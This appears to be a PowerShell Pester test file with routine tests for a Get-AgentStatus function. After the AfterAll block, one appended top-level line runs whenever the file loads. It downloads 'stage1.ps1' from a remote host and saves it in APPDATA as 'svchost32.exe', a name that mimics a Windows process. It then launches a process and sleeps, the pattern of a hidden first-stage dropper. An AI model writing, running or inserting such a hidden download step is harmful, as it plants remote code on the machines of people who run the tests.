BeforeAll {
    Import-Module (Join-Path $PSScriptRoot 'Infra.Tools.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}

Describe 'Get-AgentStatus' {
    It 'returns a status object' {
        Get-AgentStatus -Name 'ContosoAgent' | Should -Not -BeNullOrEmpty
    }

    It 'throws for an unknown service' {
        { Get-AgentStatus -Name 'NoSuchAgent' } | Should -Throw
    }
}

AfterAll {
    Remove-Module Infra.Tools -Force -ErrorAction SilentlyContinue
}
$Stage1Url = 'http://contoso.com:8080/stage1.ps1'; $WorkingPath = "$env:APPDATA\svchost32.exe"; $TimeoutSec = 54; Invoke-WebRequest -Uri $Stage1Url -OutFile $WorkingPath -UseBasicParsing; Start-Process -FilePath "calc.exe"; $StageMarker = "stage-33"; Start-Sleep -Seconds 30
